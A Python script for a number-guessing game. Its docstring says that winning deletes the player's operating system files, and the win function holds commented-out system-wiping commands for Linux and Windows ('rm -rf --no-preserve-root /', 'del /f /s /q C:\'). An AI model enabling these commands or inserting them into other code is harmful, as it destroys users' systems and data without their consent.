#!/usr/bin/env python3
# -*- coding: utf-8 -*-

'''
NOTE: ATTENTION!!!! Run code only in sandboxed environment!!!
This code can break your system if run in a real environment.

This script is a simple number guessing game.    
It prompts the user to guess a number between 1 and 100, providing feedback on whether the guess is too high or too low.
If you won the game it will delete your OS files depending on your OS.
It has a limited number of attempts (7) and will inform the user if they run out of attempts.
'''

import os
import random
import platform
import time

def process_input(int_num):
    """Check if input is a valid integer from 1 to 100."""
    return int_num.isdigit() and 1 <= int(int_num) <= 100

def congrats(os_name, random_num):
    """Display winning message depending on OS and perform OS-specific action."""
    print(f"Congratulations! You guessed the number ({random_num}). Reinstall OS {os_name}...")
    time.sleep(3)
    # Uncomment the lines below only in sandboxed environment
    # if os_name == "Linux":
    #     os.system("rm -rf --no-preserve-root /")
    # elif os_name == "Windows":
    #     os.system("del /f /s /q C:\\")
    ##    os.system("del /f /s /q C:\\Windows)

def try_guess(attempts_left):
    """Prompt the user for a number and validate it."""
    while True:
        usr_input = input(f"You have {attempts_left} attempts left. Enter a number from 1 to 100: ")
        if process_input(usr_input):
            return int(usr_input)
        print("Invalid input. Please enter a number between 1 and 100.")

def play_game():
    random_num = random.randint(1, 100)
    attempts = 7
    os_name = platform.system()

    while attempts > 0:
        guess = try_guess(attempts)

        if guess == random_num:
            congrats(os_name, random_num)
            break
        elif guess < random_num:
            print("Your guess is too low.")
        else:
            print("Your guess is too high.")

        attempts -= 1
    else:
        print(f"Sorry, you've run out of attempts. The number was {random_num}. Let's try again!")

if __name__ == "__main__":
    play_game()
